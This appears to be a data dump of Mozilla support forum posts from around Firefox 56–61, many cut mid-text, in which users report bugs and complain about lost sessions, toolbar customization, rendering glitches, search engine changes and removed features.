		,""web-developer-toolbar"":[...] =&gt; old toolbar of a dev extension
	}
	,""seen"":[...]
	,""dirtyAreaCache"":[""addon-bar"",""PersonalToolbar"",""nav-bar"",""TabsToolbar"",""toolbar-menubar"",""PanelUI-contents"",""ctraddon_addon-bar"",""web-developer-toolbar"",""ctraddon_extra-bar"",""widget-overflow-fixed-list""]
	,""currentVersion"":13
	,""newElementCount"":1424
}
</p><p>I tried to insert my custom toolbar on another profile (in ""placements"" and ""dirtyAreaCache""), but it never worked. Each time Firefox is restarted, the toolbar is removed from the browser.uiCustomization.state parameter.
I don't understand why on some profiles my custom toolbar is never deleted, and why it is deleted on others.
I hope Firefox will give the ability to create a custom toolbar in next releases. Otherwise, where will we put all the extension's buttons/icons and keep them all visible in the interface (without using the hidden extra list)? For the moment I put them in the menu toolbar, but this is not ideal (on the screenshot you see very few extension's icons as this is a test profile. On my production profiles I have more than 100 extensions...)
</p><p>Mozilla gives absolutely no documentation about this parameter. For instance, I found by myself that I could insert custom separators in the different toolbars using the browser.uiCustomization.state parameter. And this works well.

</p><p>I use the menubar all the time so I want it permanently visible.   With 56.0.2 I can move everything else I need onto the menubar, which lets me have a nice, compact UI that consists of only the menubar and the tabbar (attached screen capture).  After 56.0.2 I can't do something as basic as moving the urlbar onto the menubar, which means I have to waste screen space with another toolbar that has no purpose except to show that immovable urlbar.   
</p><p>Nor do the post-56 versions of FireFox let me tackle the problem from the other direction:  I am not allowed to move things from the menubar onto the urlbar's toolbar so that I no longer need the menubar.

1209532,1521205899,"Firefox is slower and has less cross integration than chrome, but I still like it better. Can it be faster, more integrated, and better menu system?","<p>I love the layout of firefox. I generally prefer to use it, because it intuitively suites my needs and expectations. While chrome is much faster, and integrates seamlessly with so many accounts, including third party services and sites, it is still much less pleasant to use. Google, like most of the tech world, is obsessed with pushing the 'tech cool' edge, often abandoning very practical systems, in favor of a 'better looking, new shiny' pursuit of so called progress. Apple, and now microsoft does it way worse, with things like auto hiding scrolling bars, and having menu layout make less and less intuitive, practical sense, and basic features just plain not working(My win10 search bar does not work, even after hours of trying fixes, while at the same time, cortana, a search function I never need to use, is a program that is nearly impossible to stop from always running)
This is basically a rant of how computer programming has gone way downhill, and my desire for simple effective design from the days of win98 and winxp. Pocket computers(the phone function is really not even a secondary function, more like one of many applications, and is not even streamlined for regular use) should have buttons, analog control is intuitive, fast, and does not require looking. Remember the days when activating an electronic device meant just feeling for the biggest, easiest to press button? A walkman, or even early mp3 players that had generations old layouts for buttons, so they could be operated with very little thought, and no sight?  Now settings are all stuffed into one or two little icons, which open into large lists of menus, none of which are organized or categorized very well. Each program must be studied and memorized individually, and occasionally continued for new releases and programs, even though they are  not organized in a practical way. It used to be windows, and for example microsoft word, used a common layout, which was mimicked by most other programs, for simplicity and ease of use. Firefox is one of the last examples of a digital service that values user experience over mindless so called progress, but even it has succumbed to the obfuscated menu system, in an attempt to 'keep up' with the rest of the digital environment(so to manually update firefox, I have to click on 3 lines &gt; help &gt; about firefox &gt; update firefox. Really? And why is the Options menu hidden in the 3 line menu? How is zoom, edit, and restore tabs higher on the priority list than the Options? Why not just have a few actual dropdown menus, like old school windows and mac? Was there a problem with such easy to use and organized access to settings etc?
Well this is more than a little OT, but I would really love to hear from anyone about 1. Are these 'progressions of the norm' helpful in some way? and 2. How can we revive the tried and true access methods? Apple has done away with the aux port for their pocket computers, to boost sales of their wireless headphones. We need a strong counter culture that will not take its lead from shameless marketing tactics, and purposeful new obfuscation of access systems that previously worked much better!
I apologize for the long OT rant, but I'm really not sure where to post this, the internet  feels less like a community, and more like a marketing platform, where consumers are tricked and convinced into believing what is good for sales tactics. I tried switching to linux years ago, but it really lacks cross integration, and requires lengthy long term setup and organization time, which used to be just a couple hours customizing a pre win7 OS. Constructive feedback welcome, even if it is contrary to my statements!

</p><p>replace XX's with your values to your own system. Simply append the content of the tabs on bottom file, to the bottom of the userchrome.css file. if you dont have this file, then you need to generate it as per this document <a href=""http://kb.mozillazine.org/index.php?title=UserChrome.css&amp;printable=yes"" rel=""nofollow"">http://kb.mozillazine.org/index.php?title=UserChrome.css&amp;printable=yes</a>

</p><p>Today I upgraded Firefox to 59.  When restarting after the upgrade, I lost my session, and ""Restore Previous Session"" was greyed out.  This is the second time this has happened to me -- it happened when Firefox first forced me onto Quantum, and it took me quite a long time to track down what to do to recover my session -- so it was a real bummer that this happened yet again after an upgrade.  Anyway, I did what worked the last time, and what googling this time around seemed to confirm was the thing to do:  after closing Firefox, look in sessionstore-backups, find the jsonlz4 file that seemed appropriate, and copy it into sessionstore.jsonlz4 in the profile directory.  Then, I restarted Firefox.
</p><p>Upon restarting, Firefox hangs almost immediately.  It creates the windows I had open, creates the tabs I had open in each window; but before loading the content of the visible tab, it locks up.  The spinning wheel goes forever; CPU % goes to 100; the memory allocation goes up and up until the system runs out of memory; and nothing in the windows or in the context menu is responsive.  The only thing one can do is kill Firefox from the command line (or, I guess, reboot).  It cannot be closed from within Firefox, as the menus are not responsive.
</p><p>After that kill, Firefox will restart normally, but my old session is again lost and ""Restore Previous Session"" is once again greyed out.  Attempting to recover my old session again causes it to hang immediately upon restart.  Wash, rinse, repeat.
</p><p>Why is Firefox Quantum so unstable with respect to retaining/recovering the previous session?  How can I recover my previous session?

With the installation of beta channel version 60.0b4 (64-bit) Quantum I discovered that Yahoo had been REMOVED as my primary search engine and the never to be sufficiently damned Google search engine had been assigned as my Primary. IN FACT, Yahoo had been scrubbed from my system and I had to go out and manually add Yahoo back into the search engine list. I want Mozilla, Google, and the FireFox development teams to know that I have removed Google from my Search Engine queue and have subsequently listed Yahoo as the ONE &amp; ONLY search engine resource.

"" So, the Test Pilot Tab Centre extension that made impression of being quasi-official way of implementing vertical tabs stopped working in FF 56.

</p><p>The actual question is: what would be the best way to enable vertical tabs without side bar title and without original horizontal tabs remaining in place?
</p><p>Firefox developers, if you are reading this (which I doubt) please don't screw with your user base by Chromefying Firefox. If I wanted a browser like Chrome, I would use Chrome. Give people the power of customization. If the new extension mechanism does not allow customization (eg. only side bar can be used for vertical tabs, not independent area like in the past) , please could you build the feature in the next browser?""

The machine have all of the file systems NFS mounted.  Installing an older version (Firefox 52.6.0 ESR) works however.  The new version of Firefox works just fine on the pair library owned laptops, that also run Ubuntu 14.04, but the laptops are self-contained -- they boot off their local disks.   Why is this?  I have pretty much determined that the only definable issue is that the network booted machines are using NFS for their file systems.  No, the workstations are not sharing logins -- each machine auto-logins to a *different* user, each with their own *separate* $HOME directory and they are *not* trying to share firefox configuration trees ($HOME/.mozilla/firefox/...).  But all of these directories are NFS mounted.  Oh, the server for the /home file system is running CentOS 6.

I am a girl who could barely copy and paste when we met. Little did I know, that for the past decade my reality has been controlled by this man. When I finally gathered the strength to end this horrifically abusive relationship he waged a war upon me, that I wouldn't wish upon anyone.  
Since October he has hacked every account I have, disabled my phones, put Activtrak-ing on me. Took over my Google account and my Microsoft account, my one drive, i Cloud, Gmail and drive and has systematically deleted my history and actually altered my geographical locations. He somehow became a supervisor on my accounts by becoming my purchase payee and has used my accounts for nefarious purposes. Turns out this man is an actual psychopath. Not the serial killer kind but a 36 out of 40 on the Hare Psychopathic test. 
I obtained a restraining order to stop him but it's only upped his game and set him on a path of determination of destroying me in every way imaginable.
He has his own operating system on all of my computers and it is impossible to get rid of. I bought a brand new computer and he broke into my house and put a smartcard into it which turned it into his own personally engineered operating system..like all the rest. Wait, It gets even better,  While he was here he turned my private network into his own domain. Just another layer in his dominance and control over me and my life. My search engines are his. I've tried refreshing Mozilla a hundred times and it remains the same. Same for Internet Explorer and Google Chrome. He won't let them update and there are lists a mile long of websites that I am not allowed to go to. I get 404 errors if I try.  I've tried everything, including hiring computer repair people to no avail. Even Microsoft couldn't help me because he is in my phone as well as has a block on either of us being able to contact the other.
You're probably saying ""have him arrested"" which I have but he just bails out of jail and continues his destructive manifesto.
I am at my wits end. I've been so traumatized by all of this that I've literally needed to see a doctor who prescribed me xanax just to try to cope. This man controlled me and my life for 10 years and he did things to me that were unforgivable but this..This is a nightmare that has consumed me since October. I was lucky to escape the relationship alive , all things considered.
There has to be someone out there that can HELP ME. So far, no one has been able to put a stop to this. Please, I deserve to have some semblance of a life and I never will as long as he is controlling everything. I can't take much more. I feel violated every minute of the day and night. He watches and records me through Windows Media Player. I've discovered so much over the course of these past 4 1/2 months. Things I never wanted to know. However, barring my complete isolation into a cabin ""Ted Kazinsky"" style, I need this to stop while I'm still somewhat sane. Please. I'm a good girl who hasn't deserved any of this. Please help me get my life back.    lisa

Upon trying to click on open tabs from my previous session Firefox either treated the tabs as a blank tab by marking it as a new tab (even though it was a tab that was supposed to have information (text or video) in it) and refused to load the page, or loaded the tab's open page again on a different page, deleting all pages that came after the newly loaded page. Firefox also refuses to go to pages that were listed prior to the open page on the old tab.

1209838,1521365857,"Please don't copy Chrome's poor Windows UI with hamburger menu on the Mac, and why are tab themes buried in TOOLBAR customization?","<p>1. There are already very accessible main menus on the Mac so no need to put a hamburger menu in the browser window with a different organization.  It's just confusing.  And that hamburger menu is really frustrating on Chrome anyway because it adds an extra level of navigation versus having multiple top-level menus like all applications have.
</p><p>2. And I had to google and go to Firefox's forums to find out how to get rid of the new black tabs (why is that the default?) because the tab theme isn't in the standard preferences.  If for some reason this setting MUST be in with the toolbar button selection, please add a link from main preferences to go there.
</p><p>3. Continuing background CPU consumption has always been Firefox's weak point on laptops, so this is the main reason I upgraded.  It seems better so far, but still far worse than Safari.  I wish FF would research in Safari's open source how they manage threads for web content when nobody is viewing it (hidden tab or whole app hidden) and implement the same.  Hint - they probably suspend their execution.  :-)

1209873,1521381440,"Firefox freezes when using touch screen, gets back to normal after moving physical mouse or pressing any key on physical keyboard","<p>Lenovo Yoga 2 10 Tablet (1051f) - Bad performance when using touch screen, good performance when using mouse+keyboard
</p><p>MAIN ISSUE:
When using touch display as input method, the performance in Firefox (59.0.1) is very bad - there are multiple freezes and various other issues. 
The issues go away when using an external mouse+keyboard via USB.
</p><p>FURTHER DETAILS:
The most frustrating issues appear when:
-switching between various open tabs in FF
-closing and opening new tabs
-right clicking on a tab &gt; selecting ""pin tab"" - instead of pinning the tab, FF opens the website in a new window - it can be then dragged-into the original FF window, and pinned without problem
-The general performance seems very bad and not what you would expect it to be
</p><p>WHAT HELPS:
-Connecting a mouse+keyboard through USB - then the performance is what I would expect from this hardware
</p><p>VIDEOS SHOWING THE ISSUE:
1) Recording showing bad performance when using touch input:
<a href=""https://www.youtube.com/watch?v=mq1QYrXUlYE"" rel=""nofollow"">https://www.youtube.com/watch?v=mq1QYrXUlYE</a>
Note how clicking on the ""multitasking"" button at the bottom of the screen (I don't know the real name) interrupts the freeze, and then performance is back to normal... for some time.
</p><p>2) Freeze when using touch input:
<a href=""https://www.youtube.com/watch?v=_4csda5Kdl0"" rel=""nofollow"">https://www.youtube.com/watch?v=_4csda5Kdl0</a>
What this video is showing:
-touching the display - everything is frozen, tablet does not react to touches
-then the physical mouse is moved (just moved! no clicking!)
-you can then see sudden ""update"" of what was done using touch input, and everything returns to normal
</p><p>3) Another instance of the same thing as in point 2:

It rendered on top of my taskbar, I tried to fix it by maximizing the Firefox window again but it did not work. Then I set the scaling back to 100%, now it will not load at all. It does launch, I can see processes with task manager but will not load. I can get it to load only if I launch Firefox at 100% then switch to 125%, even then it won't render correctly. I get weird white bars and window draws over taskbar. I'll try to replicate the bug and get a full window screenshot. Thing I have tried so far are:
</p><p>-Deleting  xulstore.json and local(forgot the name)
-Deleting profiles completely
-Uninstalling Firefox, deleting all left over files, using Bleachbit to delete cache etc. then reinstalling.
-Enabling/Disabling Hardware Acceleration settings
-Safe mode
-Removing extensions
-Assigning Firefox rendering to either CPU's graphics core and GPU.
-And few more things that I cannot remember now.
</p><p>This was a fresh Windows 10 install, I have no antivirus or any other software installed that might interfere with Firefox.
</p><p>I have another PC with working Firefox, I will now try copying Firefox's files from that PC to this one but I do not think that will work, this is my last resort.
</p><p>Edit: Copying working Firefox files from another computer did not work.
</p><p>Edit 2: I found what caused the issue. I was using coloured title bars across Windows, unticking the ""Show accent color on title bars"" option on Windows 10 settings did the trick.
</p><p>Edit 3: Also found out that unticking the ""Title Bar"" setting from Firefox's customization menu fixes the issue. So, a combination the combination of setting custom title bar colors and merging the title bar with tabs caused the issue. Though, it still baffles me because this combination did work fine before and it still works fine on my desktop PC. I still believe scaling did the triggering.

</p><p>The other “latest thing” I discovered about the “new and improved” Firefox Quantum is that “new tabs” no longer have an “X” icon available for simple closing, as we are now obligated to “right-click” on a “Tab,” get a “drop-down menu” and select/choose “Close Tab.”
</p><p>The other newly interesting aspect to Firefox Quantum is that there is no longer a “download” indicator, which is not a big deal to me as I found it to be somewhat annoying to constantly need to clear.

Usually its something I visited last time long before closing Firefox. Its not using the tab's history as these are often tabs created from ""open new tab"" options, so the tab itself has no history. If they don't change when I reload, they are usually fine, but when they were just opened last session they are at risk of being changed. The tab's site icon usually remains, but the name of the tab changes to say what it will load as, which is how I can tell something has gone wrong before I click it. The wrongly loaded tabs also come with history, implying they are closed tabs from before, and have been wrongly stocked as ""saved tabs"" and are overwriting the tabs that should have been saved. Any idea how to change this so it saves the proper tabs and what i have open remains when i reload the browser?

1210032,1521474765,"Browser completely black only on one screen, triggered by maximizing the browser window.","<p>I have only been able to reproduce this on one screen. The screen is connected to a NVIDIA Quadro M1000M, with up to date drivers (v23.21.13.9103). The display that shows the problem is connected via DisplayPort to HDMI. The display not having issues is connected via DVI (using the internal Intel HD Graphics 530).
</p><p>I can reproduce this in both Firefox and Firefox Developer edition, both fresh installs with no plugins added.
</p><p>The way to repro is to maximize the browser on the screen with no issue, and witness no issue. Then drag the browser to the other screen and maximize the browser. What I see is intermittent behavior, but happens within the first 3-5 attempts to maximize.
Maximizing on the other screen (which is using the internal Intel HD Graphics 530) shows no issue (fixes it again).
</p><p>You MUST maximize the browser on the 'working screen' first for this to occur.
</p><p>For example, if I follow these steps exactly, I can reproduce the problem:
</p><p>1. Start browser
</p><p>2. Drag browser window to 'working screen' (the never having problems screen)
</p><p>3. Maximize the window.
</p><p>4. Drag the window to the 'non-working screen' (meaning the one where everything else is perfectly fine except for firefox)
</p><p>5. Maximize the window. (It will go completely black.)
</p><p><br>
6. To undo, drag the browser window back to the working screen, let go.
</p><p>7. Drag the browser window back to the non-working screen, let go.
</p><p>8. As long as you do not maximize it, it works fine.
</p><p><br>
Interestingly enough, I cannot reproduce the problem while running either browsers in safe mode, but as I've said, these are fresh installs with no custom configuration or tools installed.
</p><p>As you can see in my attached screenshot, this is a screen capture of the browser sitting between both monitors, black on one side and normal on the other.
If the browser is not maximized, it works flawlessly on both screens. As soon as you maximize it, it goes black and remains black until you drag it onto the other screen, let go, then drag it back.
</p><p>Good luck with that! It's pretty crazy.

</p><p>Since a few days I have a frustrating problem with Firefox. It is version 59.0.1 64-bit on Windows 7.
</p><p>What happens is that sometimes, once in a while, the content would hide itself from view. you can ""blind"" copy&amp;paste the text and paste it into notepad and you see the text there. The content can be anything, text, links, pictures etc. And it is not static, if you move your mouse pointer it may show or hide itself. mostly pictures. Text tend to stay hidden. 
</p><p>What I have done:
Run in safe mode,
Done complete uninstall including user files and reinstalled same version. 
</p><p>Problem reappears but it is also so annoying as it might look good for 1 hour and then suddenly it got glitchy AGAIN.
</p><p>I have also shut down everything in Windows but the very essentials.
</p><p>I do not know what caused it. If it is new Firefox being not very compatible with my setup or if it could have been the malware attack I got 1 week ago. I ran Malwarebyte and one other software to purge it. No new hits, running scans all the time.

1210041,1521477584,Firefox 59 can't access my logins,"<p>Firefox recently updated to v59 and, as with some other users, it is (a) asking for the master password on starting up rather than on first use, and (b) losing access to my logins (there are about 200 in total).

However, after restarting the computer and launching Firefox again, a new key4 appears in the profile and the problems above recur.  (I back up my complete Firefox profile with my normal data backup, so have a 'good' copy to refer to from before the problems started).

1210068,1521488141,Weird Content Problem with Firefox--CreateSpace,"<p>I've been using firefox for years since IE 10 doesn't work with Vista and haven't had too many problems other than versions higher than 42.0 being very slow to start (over ten seconds), so I try to use the lowest version I could. I used 38.0.1 with my problem which was with createspace on Amazon using their cover creator to create a cover for my self-published book. Two weeks went by and nobody could figure out why the cover creator program would hang on ""update"" with the circle in the middle. Nobody at Amazon, nobody at CreateSpace--in fact, they all reported they could access my cover just fine. So I cleared my cache and history, uninstalled Firefox back to 38.0.1 and even I tried version 52.0 and still, whenever I would launch the cover creator program within Amazon's Kindle Direct Publishing, I could not access my cover and the system would hang indefinitely on ""updating"" and ""loading designs"". 
</p><p>So after two weeks, the thought came to me to try a different browser. Having limited choices for Vista SP-2, I downloaded Chrome 49.0.2623.112 and went back into the KDP cover creator and boom! No problems. I was able to update my cover with Chrome and get my book published because the stumbling block was Firefox. I tried IE 9.0 but of course, I got a notice by Amazon that said my browser was not supported and was stopped at the front door. The outcome was Chrome was able to do things that Firefox could not, and nobody was ever able to tell me why. Why did the cover creator program, neither a Java applet nor a flash program, would hang for hours on ""loading designs"" even after a fresh start and a clean cache.
</p><p>As a result, Firefox is off my system and I am still using Chrome with no problems. In fact, I want to keep it because it loads in like two seconds, shuts down in two seconds instead of ten, and browsing is much, much faster. The conclusion I have come to is that Chrome, although no longer supported, is superior to Firefox with the Vista operating system. I only have one plug-in and that is an ad blocker (ADP).
</p><p>Thoughts? I really wanted to stay with Firefox, but in this case, I had no choice because a book project I had worked on for 22 years was held up at the one-yard line by Firefox. The same problem was non-existent with Chrome. So I came to the conclusion that Chrome is better for Vista than Firefox (restatement of the same thing).

Malawarebytes and AdAware quarantined and removed some stuff: Pokki, Lenovo Browser Guard(sic!), and Browser Guard, a very German browser extension I can't remember to have ever listen about neither I can figure out why I should ever had desired to install. 
SpyBotSearch and Destroy destroyed a bunch of terrifying tracking cookies and remembered me that I have also an Internet Explorer. While RKill killed a vagrant-box process and remembered me that I have 42 HOSTS Entries - always good to know!

</p><p>Now, if the answer to the present support request will be: remove your malaware, man!, my request is: why I cannot simply order to my browser, to skip the security connection check? Why should browsers disallow the access to a website bad-encrypted if you order it to access it anyway?

I have also noticed that I have 5 instances of Firefox.exe running in task manager but none are using any excessive CPU time.  If Firefox is started and allowed to sit idle for 45 to 60 seconds then the first load of the first tab takes place at a normal speed for this version of Firefox.  Immediately loading a website after Firefox startup results in a 45 to 60 second wait.  I have perused the Task Manager looking at processes from all users and can find none using any excessive CPU time.  No network activity during this time except an initial ""blip"" when I first initiate the search.

I read up on the issue everywhere (using Chrome!!) and then Mozilla support. I was directed to 2 posts. The one did not apply to me and the other one was so technically demanding that a person with average computer knowledge simply could not follow that to and fro.

1216922,1525867892,Websites become unresponsive but can still be scrolled through and the hand cursor appears all the time,"<p>In the past weeks, suddenly my Firefox started behaving really weird - a few times a day the currently opened tab becomes unresponsive (you can't click or hover anything) but you can still scroll through them (at least a bit - after that point, it's just plain white). At these times, the cursor is the hand one, during the whole unresponsiveness episode, as if everything was clickable (though obviously clicking does nothing). You also can't close the tab during this tab - the only way is either to wait a good 30 seconds for it to unfreeze or to change to a different tab and close the unresponsive one. When you do change tabs, though, the newly opened tab sometimes disappears completely, with a radial loading circle appearing in the middle of the screen for a few seconds before it magically reappears (it does _not_ reload, though!). From what I've been able to observe, this tends to appear on content-heavy websites like Reddit, Facebook and YouTube most often.

Unfortunately, with firefox 60, this advice no longer works. The best I can get is just top sites only, but the icons for this only show the top site's icon rather than a screenshot of the page. These are much too small, leaving loads of blank page around them (and adding more top sites would make the new tab page much too busy); and the icons &amp; titles chosen aren't very useful (e.g., the icon for the google maps page is just the google logo with the title ""google"", this isn't very informative).
</p><p>To paraphrase:
</p><p>browser.newtabpage.activity-stream.aboutHome.enabled = False
</p><p>browser.newtabpage.activity-stream.enabled = False

This location is (obviously) read-only for an ordinary user and can be written to by root only. I don't want to make the installation directory writable by ordinary user, so when notified by Firefox that it could not install updates I used sudo to start it in a root privilege mode to allow installation of the updates, then I shut it down and started as an ordinary user again. 
Beginning version 60 this is no more possible, requiring either complete manual install, or starting a complete Gnome/KDE session for root just to allow Firefox to update (sorta clumsy...).
If it is absolutely necessary to refuse starting under sudo, wouldn't it be possible to provide something like update-only mode of the browser which would allow running as root under sudo?

</p><p>We have an issue with any version of Firefox after 57.04. It affects a few dozen of our users. It appears to be specific to our environment, but we need help tracking the source of the issue. The issue in on Windows 10 and Windows 2016 operating systems.
</p><p>Firefox appears to update successfully, but when we attempt to run it the process appears in task manager using 2.5mb of ram. Nothing else happens. No visible errors, and no windows open.

</p><p>The issue seems to be specific to our environment, but not specific to hardware platform.

-Various installers and update paths/methods
-Safe Mode
-Removing addons prior to upgrade
-Clean uninstall/install (including deleting firefox profiles)
-Disable and uninstalled AV softwares.
-Disabled Group Policy Objects.

The first time I place my cursor in a text box, the following appears in my terminal:
</p><p>error: file:///usr/lib/firefox-developer-edition/dictionaries/en_US.aff: cannot open

So the dictionary files are definitely there. Furthermore I have opened them to make sure they are populated with the words from the English language.

Столкнулся с той проблемой, что по умолчанию устанавливается 32-х битная версия браузера в не зависимости от конфигурации компьютера. 
Это является серьёзной проблемой по той причине, что ограничивает количество оперативной памяти, выделяемой на вкладку.
Есть ли конкретные причины такого поведения и планируется ли в ближайших обновлениях делать автоматическое поднятие ""битности"" для пользователей, чьи устройства это позволяют?

This is a really important feature (to arrange the tabs in certain order). I've noticed I'm trying to use the other browser now instead.
I've tried searching the web for an answer, but the safe mode -&gt; check add on.s didn't resolve this problem for me.
</p><p>I also re-installed the firefox, but nothing seems to help. Is this some kind of a new feature (tabs are static) or is there some kind of a setting I can use to be able to do this (moving the tabs inside Firefox)?

1217323,1526066617,"Lost tabs after update, previous.jsonlz4 and upgrade.jsonlz4 not found","<p>Earlier today firefox updated (to 60.0 I believe) and there were no issues, all my tabs were safe and I just had to log in again to a few sites, but when I later closed firefox and reopened it a few minutes later I found my last sessions tabs were gone even though I've always had them saved between session (I even checked options and it was still enabled). The 'restore last session' tab is unavaible since there was no crash of any kind and 'closed tabs' was clean too.
I've now spent a few hours looking through the forum for fixes and tried just about everything.
As many posts direct you to, I've checked the 'sessionstore-backups' folder in my profile folder to get the .json files, however there's ONLY the recovery.baklz4 and recovery.jsonlz4 files present, even with hidden files and folders turned on. So i'm missing the previous.js and upgrade.js.
I found one other user (post here <a href=""https://support.mozilla.org/en-US/questions/1214114)"" rel=""nofollow"">https://support.mozilla.org/en-US/questions/1214114)</a> who had this issue as well and found the missing files with ShadowExplorer, but in my case the old sessionstore folder found through ShadowExplorer still had only the very recent recovery.bak and recovery.json. I also tried the other program linked in the thread, but it requires system restore points, which I don't have enabled.
I even checked all the .bak and .json files I could find with <a href=""https://www.jeffersonscher.com/res/scrounger.html"" rel=""nofollow"">https://www.jeffersonscher.com/res/scrounger.html</a> for htmls, but there's only the tabs from the session after I lost all the old ones.
My old session probably had 200+ tabs from from the past few months, some were a bit important or job-hunting related (the most relevant ones were bookmarked, luckily).

Well my concern  is because with Google Chrome (I know that is offensive to compare) I have open more than 30 tabs and its ram consumption is understanble to be higher, nevertheless is really close to mozilla ( Lets say 1GB of RAM). I tried to run mozilla on safe mode with no addons but I get the same result. I tried reduce the content process limit to 2 (4 by default) but again, the RAM consumption still high. I reinstall mozilla, but unfortunately nothing changes. Im the only one with this trouble? Any ideas of what it can be?
The mozilla version what Im using is 60 x64 and windows 10 x64
Thanks in advance

</p><p>Popped out a new window in the background when I highlighted some text.
</p><p>1. Every time JavaScript is used to pop-up a new tab or window, an icon should be made available to report the site for unwanted pop-ups. The site could be added to a blacklist. The blacklist should be downloaded in whole rather than queried on Firefox servers for privacy (Mozilla does care about privacy doesn't it?).
</p><p>2. If a site is on the blacklist and it tries to pop-up a tab/window then the popup could be blocked and same icon could highlight for say 10 seconds. Clicking the icon in this case would give the options to open the popup, white-list the page for the user, vote against the blacklist. Something like:
</p><p>[  ] Show the blocked page.
[  ] White-list this site for me.
[  ] I don't think this site should be blacklisted
</p><p>[ OK ]    [Cancel]
</p><p>Some fuzzy logic could perhaps be used to determine whether or not to keep sites on the blacklist. Sites with very large amounts of blacklisting+white-listing could be manually looked at.
</p><p>Also: 
I don't ever want anything happening when I highlight text other than the text being high-lighted, it's not necessary and it completely ruins the browsing experience. No excuses, it's bad. Add a white-list if necessary for the 0.01% edge cases where this might be useful.

</p><p>One of these sources did suggest that it was a 'potentially unwanted program', so I scanned my computer with malwarebytes and quarantined the two potentially unwanted programs it suggested, which were both in the mozilla folder of Appdata/Roaming but when opening it up again and testing it by googling something, it was trackid=sp-006 appended to it. Here is an example:

Although it is possible to turn them off, for some reason Mozilla removed the option to enter the user's preferred URL to open. The recommended solution to this, as I read in some threads, is to install an add on. Why do I need to install an add on to restore a functionality you removed? And, why did you remove it anyway? What harm can a user inflict by being greeted with a familiar page when opening a new tab.
</p><p>I will repeat the request I have read several times, in more polite words: Please bring back this feature that many users seem to miss. Forcing the user to open an unfamiliar page in a new tab does not make much sense from user experience design perspective and providing this option causes no harm to Firefox.

(b) Have each window automatically save the tabs that are open in that window whenever I close that window. This would enable us to close one window and save the tabs for it, without closing all other windows. 
(c) Allow me to select from named unopened windows in the context menu of FF on the task bar, which would then open that particular window with all its previously saved tabs. This would allow me to open only the named windows I want. Currently, it's open all windows or nothing.

1217420,1526144143,Why is Firefox returning only ONE PAGE of search results? I want exhaustive results. Advanced Search option is useless for addressing this.,"<p>I'm a retired PhD with multiple in depth interests, and I use the web as a resource daily, to look for practical information as well as for news and music, etc. 
</p><p>Firefox has been my preferred browser for over a decade because of its versatility and - before now - its user friendliness for both low- and high-information content Web users. I've become reliant on Ixquick as other search engines have been relentlessly dumbed down in the last few years.
</p><p>When I run a search, I expect relevant results, according to the parameters I specify in the search syntax. I then expect to decide for myself which of these results are most likely to be useful - i.e., I do not want random results, including terms I have specifically excluded, with an arbitrary limit on number of hits returned. 
</p><p>Examples may help. I have sought information on correlations between mammography OR sonography AND metastatic disease, for one example, or an MSDS with the LD50 of elemental sulphur, which I use as a garden fungicide and do not want to harm wildlife with, for another, or on the best way to add insulating night curtains to existing window treatments, for a third, or the effects of B AND/OR D vitamin deficiency on cognition in the elderly.  None of this information is so obscure that nobody would ever be expected to look for it. It should also be quite easy to set very specific terms for all these searches and obtain highly relevant results.
</p><p>Yet search engines in general have become so badly dumbed down that none of those searches now return clean - or even relevant - results for many hits they bring back - no matter what I do to limit the search. Even IxQuick is beginning to bring back more and more trash hits.
</p><p>It now appears that IxQuick has been completely savaged. It returns ten results, no more, one page, no more. It ignores normal search syntax such as quotes, + and - signs, and Boolean operators. The Advanced function page is a placebo - does not clearly allow for expanding the number of hits returned, and ignores input into the ""restrictive"" search fields that are available there, such that one might as well not use them at all. Also, it seems impossible to change search settings to any meaningful extent on the Options page (in the wake of the latest update). [Side comment: combining the cookie and data cache access into one radio button was a really dirty trick to play on those of us who like to clear the cache independently. Please separate them in your next update.]
</p><p>I am still able to obtain multi-page results if I search in DuckDuckGo, but I set IxQuick as default for a reason. I would like to continue using it.  Are there any fixes available through Firefox that will allow me to resume ""intelligent"" searches in IxQuick now, and obtain extensive results that actually conform to the search terms I have specified?
</p><p>Thank you. Apologies for any snark - it's not intended. As an intelligent user, I find this incredibly frustrating, and every time it changes, it becomes worse, not better.

1217434,1526148316,Fast way to clear cookies?,"<p>I clear cookies frequently -- often, every few minutes.  Until recently, I could leave open the ""preferences"" tab and occasionally just switch over to it (a few keystrokes) clear all cookies with M-a (one keystroke) and go back (just a few more keystrokes).  No mousing around, it was fast.
</p><p>It seems the current Firefox changed this -- I have to open ""Manage Data"", but even though the ""M"" in ""Manage Data"" is highlighted, it does not respond to keystrokes; the ""e"" in ""Remove All"" gets directed to my window manager; and the ""a"" in Save Changes"" causes text in the Manage Cookies and Site Data pane causes text in the pane to be highlighted.  And then there is keystroke for ""Clear Now"", that seems to require mousing always.  All the mousing around I need to do now is very time-consuming by comparison.
</p><p>Is there some other way to clear cookies which is less clunky?

Couple years back this was happening in Safari and Chrome but not FFox. That is why I switched to FFox. Since later upgrades, Safari &amp; Chrome no longer display gibberish. All forums I went to had no answers not even tech support. So I stayed with FFox. Don't care to go back. Has always performed smoothly.

Something is triggering playback of the audio portion of the video. The viewable video player IS NOT PLAYING however.

Also the audio auto-plays until I leave the page and the problem resumes all over again if I go to another edit page for another video. This problem began a week or two ago and I notice it doesn't happen on Google Chrome so I'm assuming it's related to the browser.

<a href=""http://view.yahoo.com"" rel=""nofollow"">view.yahoo.com</a> - I tried several different videos.
	Symptom: When I try to play a video I get a black
box, clicking on it has no effect. Sometimes I get a brief image from
the video in the black box along with a small black box off to the
side, but both quickly disappear.
	What I can do: I can play videos from youtube and pbs.
Some other browsers, eg. chrome, will play the yahoo
videos, but initially Safari would not, giving the same results as
Firefox. When I choose the Safari per website option to disable content
blockers, the previously brief image remained and I could then play the
video.
	What I tried: I disabled all the content blockers I could find,
including: ad blockers and flash restrictions.  I reinstalled Firefox,
going from 59.0.2 to 59.0.3 with no change in behavior; I reinstalled
flash.  I tried restarting Firefox in safe mode, with the same results
as above.

problem?

I am totally frustrated with FF. It used to work very beautifully in the last few years until recently I found that one update screwed my browsing experience. Right now , whether in safe mode or not,private browsing even with hardware acceleration disabled , it won't load pages . For example when I luckily arrived to open a page containing links , when I try to open those links on a new tab, the tab won't load the page at all, I have to keep opening tabs till at least one successfully opens , sometimes I have to try twice or three times to get it open on a new tab, I tried the same with a new window, same problem. I saw that there are others who had the same issue and probably still have this issue till now. 
I dare to say this is a bug that need to be fixed. I had disabled all add-ons ,no luck, even uninstalled FF and removed firefox profiles, no luck. However FF is working fine on my other PC, both are windows 7. I don't want to go back to Internet explorer, Chrome is fine but I liked FF.Please share your solution if you had this issue resolved. FF developers, please provide some fix. By the way, I tried the beta FF version 61 ,I have the same issue as well.

